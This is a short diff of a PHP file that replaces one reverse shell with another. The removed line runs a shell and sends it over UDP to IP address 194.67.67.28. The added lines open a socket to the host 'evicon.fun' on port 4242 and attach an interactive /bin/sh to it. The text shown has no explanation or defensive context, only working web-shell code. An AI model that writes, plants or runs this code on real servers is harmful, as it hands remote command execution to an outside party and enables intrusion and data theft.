@@ -1,1 +1,5 @@
-<?php echo shell_exec('sh -i >& /dev/udp/194.67.67.28/4242 0>&1');?>
+<?php
+$sock=fsockopen("evicon.fun",4242);
+$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
+
+?>
